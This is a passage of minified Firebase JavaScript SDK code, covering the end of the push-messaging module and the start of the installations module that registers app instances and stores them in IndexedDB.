        return l(this, void 0, void 0, function () {
          var t, n;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return [4, function (a, u) {
                  return l(this, void 0, void 0, function () {
                    var t, n, r, i, o, s;
                    return p(this, function (e) {
                      switch (e.label) {
                        case 0:
                          return [4, ze(a)];
                        case 1:
                          t = e.sent(), n = Je(u), r = {
                            method: "POST",
                            headers: t,
                            body: JSON.stringify(n)
                          }, e.label = 2;
                        case 2:
                          return e.trys.push([2, 5,, 6]), [4, fetch(Ge(a.appConfig), r)];
                        case 3:
                          return [4, e.sent().json()];
                        case 4:
                          return i = e.sent(), [3, 6];
                        case 5:
                          throw o = e.sent(), Pe.create("token-subscribe-failed", {
                            errorInfo: o
                          });
                        case 6:
                          if (i.error) throw s = i.error.message, Pe.create("token-subscribe-failed", {
                            errorInfo: s
                          });
                          if (!i.token) throw Pe.create("token-subscribe-no-token");
                          return [2, i.token];
                      }
                    });
                  });
                }(r, i)];
              case 1:
                return t = e.sent(), n = {
                  token: t,
                  createTime: Date.now(),
                  subscriptionOptions: i
                }, [4, Le(r, n)];
              case 2:
                return e.sent(), [2, n.token];
            }
          });
        });
      }
      function tt(e) {
        return "object" == typeof e && !!e && Ue in e;
      }
      (Ze = Ye = Ye || {}).PUSH_RECEIVED = "push-received", Ze.NOTIFICATION_CLICKED = "notification-clicked";
      var nt = (Object.defineProperty(rt.prototype, "app", {
        get: function () {
          return this.firebaseDependencies.app;
        },
        enumerable: !0,
        configurable: !0
      }), rt.prototype.getToken = function () {
        return l(this, void 0, void 0, function () {
          var t;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return this.vapidKey || (this.vapidKey = We), [4, this.getServiceWorkerRegistration()];
              case 1:
                return t = e.sent(), "default" !== Notification.permission ? [3, 3] : [4, Notification.requestPermission()];
              case 2:
                e.sent(), e.label = 3;
              case 3:
                if ("granted" !== Notification.permission) throw Pe.create("permission-blocked");
                return [2, Qe(this.firebaseDependencies, t, this.vapidKey)];
            }
          });
        });
      }, rt.prototype.deleteToken = function () {
        return l(this, void 0, void 0, function () {
          var t;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return [4, this.getServiceWorkerRegistration()];
              case 1:
                return t = e.sent(), [2, Xe(this.firebaseDependencies, t)];
            }
          });
        });
      }, rt.prototype.requestPermission = function () {
        return l(this, void 0, void 0, function () {
          var t;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return "granted" === Notification.permission ? [2] : [4, Notification.requestPermission()];
              case 1:
                if ("granted" === (t = e.sent())) return [2];
                throw "denied" === t ? Pe.create("permission-blocked") : Pe.create("permission-default");
            }
          });
        });
      }, rt.prototype.usePublicVapidKey = function (e) {
        if (null !== this.vapidKey) throw Pe.create("use-vapid-key-after-get-token");
        if ("string" != typeof e || 0 === e.length) throw Pe.create("invalid-vapid-key");
        this.vapidKey = e;
      }, rt.prototype.useServiceWorker = function (e) {
        if (!(e instanceof ServiceWorkerRegistration)) throw Pe.create("invalid-sw-registration");
        if (this.swRegistration) throw Pe.create("use-sw-after-get-token");
        this.swRegistration = e;
      }, rt.prototype.onMessage = function (e) {
        var t = this;
        return this.onMessageCallback = "function" == typeof e ? e : e.next, function () {
          t.onMessageCallback = null;
        };
      }, rt.prototype.setBackgroundMessageHandler = function () {
        throw Pe.create("only-available-in-sw");
      }, rt.prototype.onTokenRefresh = function () {
        return function () {};
      }, rt.prototype.getServiceWorkerRegistration = function () {
        return l(this, void 0, void 0, function () {
          var t, n;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                if (this.swRegistration) return [3, 4];
                e.label = 1;
              case 1:
                return e.trys.push([1, 3,, 4]), t = this, [4, navigator.serviceWorker.register("/firebase-messaging-sw.js", {
                  scope: "/firebase-cloud-messaging-push-scope"
                })];
              case 2:
                return t.swRegistration = e.sent(), this.swRegistration.update().catch(function () {}), [3, 4];
              case 3:
                throw n = e.sent(), Pe.create("failed-service-worker-registration", {
                  browserErrorMessage: n.message
                });
              case 4:
                return [2, this.swRegistration];
            }
          });
        });
      }, rt.prototype.messageEventListener = function (o) {
        var s;
        return l(this, void 0, void 0, function () {
          var t, n, r, i;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return (null === (s = o.data) || void 0 === s ? void 0 : s.firebaseMessaging) ? (t = o.data.firebaseMessaging, n = t.type, r = t.payload, this.onMessageCallback && n === Ye.PUSH_RECEIVED && this.onMessageCallback(r), tt(i = r.data) && "1" === i["google.c.a.e"] ? [4, this.logEvent(n, i)] : [3, 2]) : [2];
              case 1:
                e.sent(), e.label = 2;
              case 2:
                return [2];
            }
          });
        });
      }, rt.prototype.logEvent = function (n, r) {
        return l(this, void 0, void 0, function () {
          var t;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return t = function (e) {
                  switch (e) {
                    case Ye.NOTIFICATION_CLICKED:
                      return "notification_open";
                    case Ye.PUSH_RECEIVED:
                      return "notification_foreground";
                    default:
                      throw new Error();
                  }
                }(n), [4, this.firebaseDependencies.analyticsProvider.get()];
              case 1:
                return e.sent().logEvent(t, {
                  message_id: r[Ue],
                  message_name: r["google.c.a.c_l"],
                  message_time: r["google.c.a.ts"],
                  message_device_time: Math.floor(Date.now() / 1e3)
                }), [2];
            }
          });
        });
      }, rt);
      function rt(e) {
        var t = this;
        this.firebaseDependencies = e, this.vapidKey = null, this.onMessageCallback = null, navigator.serviceWorker.addEventListener("message", function (e) {
          return t.messageEventListener(e);
        });
      }
      var it = (Object.defineProperty(ot.prototype, "app", {
        get: function () {
          return this.firebaseDependencies.app;
        },
        enumerable: !0,
        configurable: !0
      }), ot.prototype.setBackgroundMessageHandler = function (e) {
        if (!e || "function" != typeof e) throw Pe.create("invalid-bg-handler");
        this.bgMessageHandler = e;
      }, ot.prototype.getToken = function () {
        var n, r;
        return l(this, void 0, void 0, function () {
          var t;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return this.vapidKey ? [3, 2] : [4, Re(this.firebaseDependencies)];
              case 1:
                t = e.sent(), this.vapidKey = null !== (r = null === (n = null == t ? void 0 : t.subscriptionOptions) || void 0 === n ? void 0 : n.vapidKey) && void 0 !== r ? r : We, e.label = 2;
              case 2:
                return [2, Qe(this.firebaseDependencies, self.registration, this.vapidKey)];
            }
          });
        });
      }, ot.prototype.deleteToken = function () {
        return Xe(this.firebaseDependencies, self.registration);
      }, ot.prototype.requestPermission = function () {
        throw Pe.create("only-available-in-window");
      }, ot.prototype.usePublicVapidKey = function (e) {
        if (null !== this.vapidKey) throw Pe.create("use-vapid-key-after-get-token");
        if ("string" != typeof e || 0 === e.length) throw Pe.create("invalid-vapid-key");
        this.vapidKey = e;
      }, ot.prototype.useServiceWorker = function () {
        throw Pe.create("only-available-in-window");
      }, ot.prototype.onMessage = function () {
        throw Pe.create("only-available-in-window");
      }, ot.prototype.onTokenRefresh = function () {
        throw Pe.create("only-available-in-window");
      }, ot.prototype.onPush = function (i) {
        return l(this, void 0, void 0, function () {
          var t, n, r;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return (t = function (e) {
                  var t = e.data;
                  if (!t) return null;
                  try {
                    return t.json();
                  } catch (e) {
                    return null;
                  }
                }(i)) ? [4, st()] : [2];
              case 1:
                return function (e) {
                  return e.some(function (e) {
                    return "visible" === e.visibilityState && !e.url.startsWith("chrome-extension://");
                  });
                }(n = e.sent()) ? [2, function (e, t) {
                  var n,
                    r,
                    i = at(Ye.PUSH_RECEIVED, t);
                  try {
                    for (var o = c(e), s = o.next(); !s.done; s = o.next()) s.value.postMessage(i);
                  } catch (e) {
                    n = {
                      error: e
                    };
                  } finally {
                    try {
                      s && !s.done && (r = o.return) && r.call(o);
                    } finally {
                      if (n) throw n.error;
                    }
                  }
                }(n, t)] : (r = function (e) {
                  var t;
                  if (e && "object" == typeof e.notification) {
                    var n = u({}, e.notification);
                    return n.data = u(u({}, e.notification.data), ((t = {})[He] = e, t)), n;
                  }
                }(t)) ? [4, function (e) {
                  var t,
                    n = null !== (t = e.title) && void 0 !== t ? t : "",
                    r = e.actions,
                    i = Notification.maxActions;
                  return r && i && r.length > i && console.warn("This browser only supports " + i + " actions. The remaining actions will not be displayed."), self.registration.showNotification(n, e);
                }(r)] : [3, 3];
              case 2:
                return e.sent(), [3, 5];
              case 3:
                return this.bgMessageHandler ? [4, this.bgMessageHandler(t)] : [3, 5];
              case 4:
                e.sent(), e.label = 5;
              case 5:
                return [2];
            }
          });
        });
      }, ot.prototype.onSubChange = function (n) {
        var r, i;
        return l(this, void 0, void 0, function () {
          var t;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return n.newSubscription ? [3, 2] : [4, Xe(this.firebaseDependencies, self.registration)];
              case 1:
                return e.sent(), [2];
              case 2:
                return [4, Re(this.firebaseDependencies)];
              case 3:
                return t = e.sent(), [4, Xe(this.firebaseDependencies, self.registration)];
              case 4:
                return e.sent(), [4, Qe(this.firebaseDependencies, self.registration, null !== (i = null === (r = null == t ? void 0 : t.subscriptionOptions) || void 0 === r ? void 0 : r.vapidKey) && void 0 !== i ? i : We)];
              case 5:
                return e.sent(), [2];
            }
          });
        });
      }, ot.prototype.onNotificationClick = function (o) {
        var s, a;
        return l(this, void 0, void 0, function () {
          var t, n, r, i;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return (t = null === (a = null === (s = o.notification) || void 0 === s ? void 0 : s.data) || void 0 === a ? void 0 : a[He]) ? o.action ? [2] : (o.stopImmediatePropagation(), o.notification.close(), (n = function (e) {
                  var t,
                    n,
                    r,
                    i = null !== (n = null === (t = e.fcmOptions) || void 0 === t ? void 0 : t.link) && void 0 !== n ? n : null === (r = e.notification) || void 0 === r ? void 0 : r.click_action;
                  return i || (tt(e.data) ? self.location.origin : null);
                }(t)) ? [4, function (u) {
                  return l(this, void 0, void 0, function () {
                    var t, n, r, i, o, s, a;
                    return p(this, function (e) {
                      switch (e.label) {
                        case 0:
                          return t = new URL(u, self.location.href).href, [4, st()];
                        case 1:
                          n = e.sent();
                          try {
                            for (r = c(n), i = r.next(); !i.done; i = r.next()) if (o = i.value, new URL(o.url, self.location.href).href === t) return [2, o];
                          } catch (e) {
                            s = {
                              error: e
                            };
                          } finally {
                            try {
                              i && !i.done && (a = r.return) && a.call(r);
                            } finally {
                              if (s) throw s.error;
                            }
                          }
                          return [2, null];
                      }
                    });
                  });
                }(n)] : [2]) : [2];
              case 1:
                return (r = e.sent()) ? [3, 4] : [4, self.clients.openWindow(n)];
              case 2:
                return r = e.sent(), [4, function (t) {
                  return new Promise(function (e) {
                    setTimeout(e, t);
                  });
                }(3e3)];
              case 3:
                return e.sent(), [3, 6];
              case 4:
                return [4, r.focus()];
              case 5:
                r = e.sent(), e.label = 6;
              case 6:
                return r ? (i = at(Ye.NOTIFICATION_CLICKED, t), [2, r.postMessage(i)]) : [2];
            }
          });
        });
      }, ot);
      function ot(e) {
        var t = this;
        this.firebaseDependencies = e, this.vapidKey = null, this.bgMessageHandler = null, self.addEventListener("push", function (e) {
          e.waitUntil(t.onPush(e));
        }), self.addEventListener("pushsubscriptionchange", function (e) {
          e.waitUntil(t.onSubChange(e));
        }), self.addEventListener("notificationclick", function (e) {
          e.waitUntil(t.onNotificationClick(e));
        });
      }
      function st() {
        return self.clients.matchAll({
          type: "window",
          includeUncontrolled: !0
        });
      }
      function at(e, t) {
        return {
          firebaseMessaging: {
            type: e,
            payload: t
          }
        };
      }
      var ut = {
        isSupported: ct
      };
      function ct() {
        return self && "ServiceWorkerGlobalScope" in self ? "indexedDB" in self && null !== indexedDB && "PushManager" in self && "Notification" in self && ServiceWorkerRegistration.prototype.hasOwnProperty("showNotification") && PushSubscription.prototype.hasOwnProperty("getKey") : "indexedDB" in window && null !== indexedDB && navigator.cookieEnabled && "serviceWorker" in navigator && "PushManager" in window && "Notification" in window && "fetch" in window && ServiceWorkerRegistration.prototype.hasOwnProperty("showNotification") && PushSubscription.prototype.hasOwnProperty("getKey");
      }
      ft.INTERNAL.registerComponent(new g("messaging", function (e) {
        var t = e.getProvider("app").getImmediate(),
          n = {
            app: t,
            appConfig: function (e) {
              var t, n;
              if (!e || !e.options) throw je("App Configuration Object");
              if (!e.name) throw je("App Name");
              var r = e.options;
              try {
                for (var i = c(["projectId", "apiKey", "appId", "messagingSenderId"]), o = i.next(); !o.done; o = i.next()) {
                  var s = o.value;
                  if (!r[s]) throw je(s);
                }
              } catch (e) {
                t = {
                  error: e
                };
              } finally {
                try {
                  o && !o.done && (n = i.return) && n.call(i);
                } finally {
                  if (t) throw t.error;
                }
              }
              return {
                appName: e.name,
                projectId: r.projectId,
                apiKey: r.apiKey,
                appId: r.appId,
                senderId: r.messagingSenderId
              };
            }(t),
            installations: e.getProvider("installations").getImmediate(),
            analyticsProvider: e.getProvider("analytics-internal")
          };
        if (!ct()) throw Pe.create("unsupported-browser");
        return self && "ServiceWorkerGlobalScope" in self ? new it(n) : new nt(n);
      }, "PUBLIC").setServiceProps(ut));
    }).apply(this, arguments);
  } catch (e) {
    throw console.error(e), new Error("Cannot instantiate firebase-messaging.js - be sure to load firebase-app.js first.");
  }
});
!function (e, t) {
  "object" == typeof exports && "undefined" != typeof module ? t(require("@firebase/app")) : "function" == typeof define && define.amd ? define(["@firebase/app"], t) : t((e = e || self).firebase);
}(this, function (tt) {
  "use strict";

  try {
    (function () {
      tt = tt && Object.prototype.hasOwnProperty.call(tt, "default") ? tt.default : tt;
      var n = function (e, t) {
        return (n = Object.setPrototypeOf || {
          __proto__: []
        } instanceof Array && function (e, t) {
          e.__proto__ = t;
        } || function (e, t) {
          for (var n in t) t.hasOwnProperty(n) && (e[n] = t[n]);
        })(e, t);
      };
      var a = function () {
        return (a = Object.assign || function (e) {
          for (var t, n = 1, r = arguments.length; n < r; n++) for (var i in t = arguments[n]) Object.prototype.hasOwnProperty.call(t, i) && (e[i] = t[i]);
          return e;
        }).apply(this, arguments);
      };
      function f(e, a, s, u) {
        return new (s = s || Promise)(function (t, n) {
          function r(e) {
            try {
              o(u.next(e));
            } catch (e) {
              n(e);
            }
          }
          function i(e) {
            try {
              o(u.throw(e));
            } catch (e) {
              n(e);
            }
          }
          function o(e) {
            e.done ? t(e.value) : function (t) {
              return t instanceof s ? t : new s(function (e) {
                e(t);
              });
            }(e.value).then(r, i);
          }
          o((u = u.apply(e, a || [])).next());
        });
      }
      function p(n, r) {
        var i,
          o,
          a,
          e,
          s = {
            label: 0,
            sent: function () {
              if (1 & a[0]) throw a[1];
              return a[1];
            },
            trys: [],
            ops: []
          };
        return e = {
          next: t(0),
          throw: t(1),
          return: t(2)
        }, "function" == typeof Symbol && (e[Symbol.iterator] = function () {
          return this;
        }), e;
        function t(t) {
          return function (e) {
            return function (t) {
              if (i) throw new TypeError("Generator is already executing.");
              for (; s;) try {
                if (i = 1, o && (a = 2 & t[0] ? o.return : t[0] ? o.throw || ((a = o.return) && a.call(o), 0) : o.next) && !(a = a.call(o, t[1])).done) return a;
                switch (o = 0, a && (t = [2 & t[0], a.value]), t[0]) {
                  case 0:
                  case 1:
                    a = t;
                    break;
                  case 4:
                    return s.label++, {
                      value: t[1],
                      done: !1
                    };
                  case 5:
                    s.label++, o = t[1], t = [0];
                    continue;
                  case 7:
                    t = s.ops.pop(), s.trys.pop();
                    continue;
                  default:
                    if (!(a = 0 < (a = s.trys).length && a[a.length - 1]) && (6 === t[0] || 2 === t[0])) {
                      s = 0;
                      continue;
                    }
                    if (3 === t[0] && (!a || t[1] > a[0] && t[1] < a[3])) {
                      s.label = t[1];
                      break;
                    }
                    if (6 === t[0] && s.label < a[1]) {
                      s.label = a[1], a = t;
                      break;
                    }
                    if (a && s.label < a[2]) {
                      s.label = a[2], s.ops.push(t);
                      break;
                    }
                    a[2] && s.ops.pop(), s.trys.pop();
                    continue;
                }
                t = r.call(n, s);
              } catch (e) {
                t = [6, e], o = 0;
              } finally {
                i = a = 0;
              }
              if (5 & t[0]) throw t[1];
              return {
                value: t[0] ? t[1] : void 0,
                done: !0
              };
            }([t, e]);
          };
        }
      }
      function s(e) {
        var t = "function" == typeof Symbol && Symbol.iterator,
          n = t && e[t],
          r = 0;
        if (n) return n.call(e);
        if (e && "number" == typeof e.length) return {
          next: function () {
            return e && r >= e.length && (e = void 0), {
              value: e && e[r++],
              done: !e
            };
          }
        };
        throw new TypeError(t ? "Object is not iterable." : "Symbol.iterator is not defined.");
      }
      function r(e, t) {
        var n = "function" == typeof Symbol && e[Symbol.iterator];
        if (!n) return e;
        var r,
          i,
          o = n.call(e),
          a = [];
        try {
          for (; (void 0 === t || 0 < t--) && !(r = o.next()).done;) a.push(r.value);
        } catch (e) {
          i = {
            error: e
          };
        } finally {
          try {
            r && !r.done && (n = o.return) && n.call(o);
          } finally {
            if (i) throw i.error;
          }
        }
        return a;
      }
      var e,
        t,
        i,
        d = (i = Error, n(e = u, t = i), void (e.prototype = null === t ? Object.create(t) : (o.prototype = t.prototype, new o())), u);
      function o() {
        this.constructor = e;
      }
      function u(e, t) {
        var n = i.call(this, t) || this;
        return n.code = e, n.name = "FirebaseError", Object.setPrototypeOf(n, u.prototype), Error.captureStackTrace && Error.captureStackTrace(n, c.prototype.create), n;
      }
      var c = (l.prototype.create = function (e) {
        for (var t = [], n = 1; n < arguments.length; n++) t[n - 1] = arguments[n];
        for (var r = t[0] || {}, i = this.service + "/" + e, o = this.errors[e], a = o ? function (e, r) {
            return e.replace(h, function (e, t) {
              var n = r[t];
              return null != n ? n.toString() : "<" + t + "?>";
            });
          }(o, r) : "Error", s = this.serviceName + ": " + a + " (" + i + ").", u = new d(i, s), c = 0, l = Object.keys(r); c < l.length; c++) {
          var f = l[c];
          "_" !== f.slice(-1) && (f in u && console.warn('Overwriting FirebaseError base field "' + f + '" can cause unexpected behavior.'), u[f] = r[f]);
        }
        return u;
      }, l);
      function l(e, t, n) {
        this.service = e, this.serviceName = t, this.errors = n;
      }
      var h = /\{\$([^}]+)}/g,
        g = (v.prototype.setInstantiationMode = function (e) {
          return this.instantiationMode = e, this;
        }, v.prototype.setMultipleInstances = function (e) {
          return this.multipleInstances = e, this;
        }, v.prototype.setServiceProps = function (e) {
          return this.serviceProps = e, this;
        }, v);
      function v(e, t, n) {
        this.name = e, this.instanceFactory = t, this.type = n, this.multipleInstances = !1, this.serviceProps = {}, this.instantiationMode = "LAZY";
      }
      function y(n) {
        return new Promise(function (e, t) {
          n.onsuccess = function () {
            e(n.result);
          }, n.onerror = function () {
            t(n.error);
          };
        });
      }
      function w(n, r, i) {
        var o,
          e = new Promise(function (e, t) {
            y(o = n[r].apply(n, i)).then(e, t);
          });
        return e.request = o, e;
      }
      function b(e, n, t) {
        t.forEach(function (t) {
          Object.defineProperty(e.prototype, t, {
            get: function () {
              return this[n][t];
            },
            set: function (e) {
              this[n][t] = e;
            }
          });
        });
      }
      function m(t, n, r, e) {
        e.forEach(function (e) {
          e in r.prototype && (t.prototype[e] = function () {
            return w(this[n], e, arguments);
          });
        });
      }
      function _(t, n, r, e) {
        e.forEach(function (e) {
          e in r.prototype && (t.prototype[e] = function () {
            return this[n][e].apply(this[n], arguments);
          });
        });
      }
      function E(t, n, r, e) {
        e.forEach(function (e) {
          e in r.prototype && (t.prototype[e] = function () {
            return function (e, t, n) {
              var r = w(e, t, n);
              return r.then(function (e) {
                if (e) return new S(e, r.request);
              });
            }(this[n], e, arguments);
          });
        });
      }
      function I(e) {
        this._index = e;
      }
      function S(e, t) {
        this._cursor = e, this._request = t;
      }
      function O(e) {
        this._store = e;
      }
      function T(n) {
        this._tx = n, this.complete = new Promise(function (e, t) {
          n.oncomplete = function () {
            e();
          }, n.onerror = function () {
            t(n.error);
          }, n.onabort = function () {
            t(n.error);
          };
        });
      }
      function C(e, t, n) {
        this._db = e, this.oldVersion = t, this.transaction = new T(n);
      }
      function N(e) {
        this._db = e;
      }
      b(I, "_index", ["name", "keyPath", "multiEntry", "unique"]), m(I, "_index", IDBIndex, ["get", "getKey", "getAll", "getAllKeys", "count"]), E(I, "_index", IDBIndex, ["openCursor", "openKeyCursor"]), b(S, "_cursor", ["direction", "key", "primaryKey", "value"]), m(S, "_cursor", IDBCursor, ["update", "delete"]), ["advance", "continue", "continuePrimaryKey"].forEach(function (n) {
        n in IDBCursor.prototype && (S.prototype[n] = function () {
          var t = this,
            e = arguments;
          return Promise.resolve().then(function () {
            return t._cursor[n].apply(t._cursor, e), y(t._request).then(function (e) {
              if (e) return new S(e, t._request);
            });
          });
        });
      }), O.prototype.createIndex = function () {
        return new I(this._store.createIndex.apply(this._store, arguments));
      }, O.prototype.index = function () {
        return new I(this._store.index.apply(this._store, arguments));
      }, b(O, "_store", ["name", "keyPath", "indexNames", "autoIncrement"]), m(O, "_store", IDBObjectStore, ["put", "add", "delete", "clear", "get", "getAll", "getKey", "getAllKeys", "count"]), E(O, "_store", IDBObjectStore, ["openCursor", "openKeyCursor"]), _(O, "_store", IDBObjectStore, ["deleteIndex"]), T.prototype.objectStore = function () {
        return new O(this._tx.objectStore.apply(this._tx, arguments));
      }, b(T, "_tx", ["objectStoreNames", "mode"]), _(T, "_tx", IDBTransaction, ["abort"]), C.prototype.createObjectStore = function () {
        return new O(this._db.createObjectStore.apply(this._db, arguments));
      }, b(C, "_db", ["name", "version", "objectStoreNames"]), _(C, "_db", IDBDatabase, ["deleteObjectStore", "close"]), N.prototype.transaction = function () {
        return new T(this._db.transaction.apply(this._db, arguments));
      }, b(N, "_db", ["name", "version", "objectStoreNames"]), _(N, "_db", IDBDatabase, ["close"]), ["openCursor", "openKeyCursor"].forEach(function (i) {
        [O, I].forEach(function (e) {
          i in e.prototype && (e.prototype[i.replace("open", "iterate")] = function () {
            var e = function (e) {
                return Array.prototype.slice.call(e);
              }(arguments),
              t = e[e.length - 1],
              n = this._store || this._index,
              r = n[i].apply(n, e.slice(0, -1));
            r.onsuccess = function () {
              t(r.result);
            };
          });
        });
      }), [I, O].forEach(function (e) {
        e.prototype.getAll || (e.prototype.getAll = function (e, n) {
          var r = this,
            i = [];
          return new Promise(function (t) {
            r.iterateCursor(e, function (e) {
              e ? (i.push(e.value), void 0 === n || i.length != n ? e.continue() : t(i)) : t(i);
            });
          });
        });
      });
      var P,
        A = "0.4.6",
        R = 1e4,
        j = "w:" + A,
        L = "FIS_v2",
        k = "https://firebaseinstallations.googleapis.com/v1",
        x = 36e5,
        D = ((P = {})["missing-app-config-values"] = 'Missing App configuration value: "{$valueName}"', P["not-registered"] = "Firebase Installation is not registered.", P["installation-not-found"] = "Firebase Installation not found.", P["request-failed"] = '{$requestName} request failed with error "{$serverCode} {$serverStatus}: {$serverMessage}"', P["app-offline"] = "Could not process request. Application offline.", P["delete-pending-registration"] = "Can't delete installation while there is a pending registration request.", P),
        H = new c("installations", "Installations", D);
      function F(e) {
        return e instanceof d && e.code.includes("request-failed");
      }
      function B(e) {
        var t = e.projectId;
        return k + "/projects/" + t + "/installations";
      }
      function q(e) {
        return {
          token: e.token,
          requestStatus: 2,
          expiresIn: function (e) {
            return Number(e.replace("s", "000"));
          }(e.expiresIn),
          creationTime: Date.now()
        };
      }
      function V(r, i) {
        return f(this, void 0, void 0, function () {
          var t, n;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return [4, i.json()];
              case 1:
                return t = e.sent(), n = t.error, [2, H.create("request-failed", {
                  requestName: r,
                  serverCode: n.code,
                  serverMessage: n.message,
                  serverStatus: n.status
                })];
            }
          });
        });
      }
      function G(e) {
        var t = e.apiKey;
        return new Headers({
          "Content-Type": "application/json",
          Accept: "application/json",
          "x-goog-api-key": t
        });
      }
      function U(e, t) {
        var n = t.refreshToken,
          r = G(e);
        return r.append("Authorization", function (e) {
          return L + " " + e;
        }(n)), r;
      }
      function M(n) {
        return f(this, void 0, void 0, function () {
          var t;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return [4, n()];
              case 1:
                return 500 <= (t = e.sent()).status && t.status < 600 ? [2, n()] : [2, t];
            }
          });
        });
      }
      function K(t) {
        return new Promise(function (e) {
          setTimeout(e, t);
        });
      }
      function W(e) {
        return btoa(String.fromCharCode.apply(String, function () {
          for (var e = [], t = 0; t < arguments.length; t++) e = e.concat(r(arguments[t]));
          return e;
        }(e))).replace(/\+/g, "-").replace(/\//g, "_");
      }
      var $ = /^[cdef][\w-]{21}$/,
        z = "";
      function J() {
        try {
          var e = new Uint8Array(17);
          (self.crypto || self.msCrypto).getRandomValues(e), e[0] = 112 + e[0] % 16;
          var t = function (e) {
            return W(e).substr(0, 22);
          }(e);
          return $.test(t) ? t : z;
        } catch (e) {
          return z;
        }
      }
      function Y(e) {
        return e.appName + "!" + e.appId;
      }
      var X = new Map();
      function Z(e, t) {
        var n = Y(e);
        Q(n, t), function (e, t) {
          var n = te();
          n && n.postMessage({
            key: e,
            fid: t
          });
          ne();
        }(n, t);
      }
      function Q(e, t) {
        var n,
          r,
          i = X.get(e);
        if (i) try {
          for (var o = s(i), a = o.next(); !a.done; a = o.next()) {
            (0, a.value)(t);
          }
        } catch (e) {
          n = {
            error: e
          };
        } finally {
          try {
            a && !a.done && (r = o.return) && r.call(o);
          } finally {
            if (n) throw n.error;
          }
        }
      }
      var ee = null;
      function te() {
        return !ee && "BroadcastChannel" in self && ((ee = new BroadcastChannel("[Firebase] FID Change")).onmessage = function (e) {
          Q(e.data.key, e.data.fid);
        }), ee;
      }
      function ne() {
        0 === X.size && ee && (ee.close(), ee = null);
      }
      var re,
        ie,
        oe,
        ae,
        se = "firebase-installations-database",
        ue = 1,
        ce = "firebase-installations-store",
        le = null;
      function fe() {
        return le = le || function (e, t, n) {
          var r = w(indexedDB, "open", [e, t]),
            i = r.request;
          return i && (i.onupgradeneeded = function (e) {
            n && n(new C(i.result, e.oldVersion, i.transaction));
          }), r.then(function (e) {
            return new N(e);
          });
        }(se, ue, function (e) {
          switch (e.oldVersion) {
            case 0:
              e.createObjectStore(ce);
          }
        });
      }
      function pe(a, s) {
        return f(this, void 0, void 0, function () {
          var t, n, r, i, o;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return t = Y(a), [4, fe()];
              case 1:
                return n = e.sent(), r = n.transaction(ce, "readwrite"), [4, (i = r.objectStore(ce)).get(t)];
              case 2:
                return o = e.sent(), [4, i.put(s, t)];
              case 3:
                return e.sent(), [4, r.complete];
              case 4:
                return e.sent(), o && o.fid === s.fid || Z(a, s.fid), [2, s];
            }
          });
        });
      }
      function de(i) {
        return f(this, void 0, void 0, function () {
          var t, n, r;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return t = Y(i), [4, fe()];
              case 1:
                return n = e.sent(), [4, (r = n.transaction(ce, "readwrite")).objectStore(ce).delete(t)];
              case 2:
                return e.sent(), [4, r.complete];
              case 3:
                return e.sent(), [2];
            }
          });
        });
      }
      function he(s, u) {
        return f(this, void 0, void 0, function () {
          var t, n, r, i, o, a;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return t = Y(s), [4, fe()];
              case 1:
                return n = e.sent(), r = n.transaction(ce, "readwrite"), [4, (i = r.objectStore(ce)).get(t)];
              case 2:
                return o = e.sent(), void 0 !== (a = u(o)) ? [3, 4] : [4, i.delete(t)];
              case 3:
                return e.sent(), [3, 6];
              case 4:
                return [4, i.put(a, t)];
              case 5:
                e.sent(), e.label = 6;
              case 6:
                return [4, r.complete];
              case 7:
                return e.sent(), !a || o && o.fid === a.fid || Z(s, a.fid), [2, a];
            }
          });
        });
      }
      function ge(i) {
        return f(this, void 0, void 0, function () {
          var r, t, n;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return [4, he(i, function (e) {
                  var t = function (e) {
                      return ye(e || {
                        fid: J(),
                        registrationStatus: 0
                      });
                    }(e),
                    n = function (e, t) {
                      {
                        if (0 !== t.registrationStatus) return 1 === t.registrationStatus ? {
                          installationEntry: t,
                          registrationPromise: function (o) {
                            return f(this, void 0, void 0, function () {
                              var t, n, r, i;
                              return p(this, function (e) {
                                switch (e.label) {
                                  case 0:
                                    return [4, ve(o)];
                                  case 1:
                                    t = e.sent(), e.label = 2;
                                  case 2:
                                    return 1 !== t.registrationStatus ? [3, 5] : [4, K(100)];
                                  case 3:
                                    return e.sent(), [4, ve(o)];
                                  case 4:
                                    return t = e.sent(), [3, 2];
                                  case 5:
                                    return 0 !== t.registrationStatus ? [3, 7] : [4, ge(o)];
                                  case 6:
                                    return n = e.sent(), r = n.installationEntry, (i = n.registrationPromise) ? [2, i] : [2, r];
                                  case 7:
                                    return [2, t];
                                }
                              });
                            });
                          }(e)
                        } : {
                          installationEntry: t
                        };
                        if (!navigator.onLine) {
                          var n = Promise.reject(H.create("app-offline"));
                          return {
                            installationEntry: t,
                            registrationPromise: n
                          };
                        }
                        var r = {
                            fid: t.fid,
                            registrationStatus: 1,
                            registrationTime: Date.now()
                          },
                          i = function (r, i) {
                            return f(this, void 0, void 0, function () {
                              var t, n;
                              return p(this, function (e) {
                                switch (e.label) {
                                  case 0:
                                    return e.trys.push([0, 2,, 7]), [4, function (s, e) {
                                      var u = e.fid;
                                      return f(this, void 0, void 0, function () {
                                        var t, n, r, i, o, a;
                                        return p(this, function (e) {
                                          switch (e.label) {
                                            case 0:
                                              return t = B(s), n = G(s), r = {
                                                fid: u,
                                                authVersion: L,
                                                appId: s.appId,
                                                sdkVersion: j
                                              }, i = {
                                                method: "POST",
                                                headers: n,
                                                body: JSON.stringify(r)
                                              }, [4, M(function () {
                                                return fetch(t, i);
                                              })];
                                            case 1:
                                              return (o = e.sent()).ok ? [4, o.json()] : [3, 3];
                                            case 2:
                                              return a = e.sent(), [2, {
                                                fid: a.fid || u,
                                                registrationStatus: 2,
                                                refreshToken: a.refreshToken,
                                                authToken: q(a.authToken)
                                              }];
                                            case 3:
